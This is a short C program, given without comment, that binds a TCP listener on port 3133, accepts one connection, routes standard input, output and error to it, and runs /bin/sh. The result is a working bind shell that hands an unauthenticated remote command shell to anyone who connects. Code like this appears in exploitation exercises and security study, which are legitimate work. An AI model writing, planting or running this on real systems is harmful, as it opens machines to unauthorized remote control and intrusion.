#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void){
  int listen_sock = socket(AF_INET,SOCK_STREAM,0);
  struct sockaddr_in server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = INADDR_ANY;
  server_addr.sin_port = htons(3133);

  bind(listen_sock,(struct sockaddr *)&server_addr,sizeof(server_addr));
  listen(listen_sock,0);

  int conn_sock = accept(listen_sock,NULL,NULL);
  dup2(conn_sock,0);
  dup2(conn_sock,1);
  dup2(conn_sock,2);

  execve("/bin/sh",NULL,NULL);

}
